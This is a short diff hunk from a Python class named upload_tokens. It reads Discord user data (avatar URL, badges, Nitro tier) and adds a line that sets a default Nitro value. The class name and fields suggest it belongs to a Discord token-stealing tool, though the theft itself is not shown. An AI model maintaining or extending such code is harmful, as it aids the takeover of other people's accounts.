@@ -219,6 +219,7 @@ class upload_tokens:
             avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
             badges = ' '.join([flag[0] for flag in self.calc_flags(user['public_flags'])])
             
+            nitro = ''
             if 'premium_type' in user:
                 if user['premium_type'] == 1:
                     nitro = 'Nitro Classic' 
